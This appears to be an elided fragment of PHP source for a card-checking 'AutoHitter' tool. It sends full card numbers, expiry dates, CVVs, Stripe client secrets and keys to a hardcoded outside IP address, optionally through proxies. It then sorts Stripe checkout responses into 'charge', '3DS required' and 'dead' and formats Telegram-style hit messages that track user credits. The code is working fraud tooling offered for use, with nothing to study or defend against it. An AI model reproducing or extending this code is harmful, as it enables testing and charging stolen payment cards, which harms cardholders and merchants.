...
if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    ...
    $fullProxy = "$proxyHost:$proxyPort:$proxyUsername:$proxyPassword";
} else {
    $fullProxy = '';
}
...
$requestUrl = "http://206.206.78.217:1070/?cc={$cc}|{$month}|{$year}|{$cvv}&client_secet=" . urlencode($client_secret). "&pk=" . urlencode($pk). "&acct=" . urlencode($acct);
if ($proxyRequired && $fullProxy) {
    $requestUrl .= "&proxy=" . urlencode($fullProxy);
}
$req = curl_init();
...
// Debug log
// $file = "inbuiltccn_cc_responses.txt";
// $handle = fopen($file, "a");
// $content = "cc = $cc1\nresponse = $response\n\n";
...
$paymentDetails = [
    'price' => $responseData['price'] ?? 'USD 0.00',
    'details' => $responseData['details'] ?? 'Unknown',
];
...
$dead_responses = [
    ...
    "This PaymentIntent's payment_method could not be updated because it has a status of canceled" => "Checkout Session has been voided",
...
if (stripos($response, 'Payment Successful') !== false) {
    $err = 'Payment Successful ' . $paymentDetails['price'];
    ...
    $fullResult =
        ...
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> Inbuilt AutoHitter (CCN)\n" .
        "━━━━━━━━━━━\n" .
    ...
    $publicMessage =
        ...
        "<b>Response ➜</b> {$err} 🎉\n" .
        "<b>Gateway ➜</b> Inbuilt AutoHitter (CCN)\n" .
        "━━━━━━━━\n" .
    ...
    echo json_encode([
        'status' => 'charge',
        'Response' => $err,
        'Gateway' => 'Inbuilt AutoHitter (CCN)',
        'cc' => $cc1,
        'credits' => $newCredits,
    ...
    exit;
} elseif (stripos($response, 'stripe_3ds2_fingerprint') !== false) {
    $err = '3DS Authentication Required';
    ...
    if ($deadFound) {
        ...
        $err = $responseData['response'] ?? 'Unknown Error';
        echo json_encode([
            'status' => 'dead',
            'Response' => $err,
            'Gateway' => 'Inbuilt AutoHitter (CCN)',
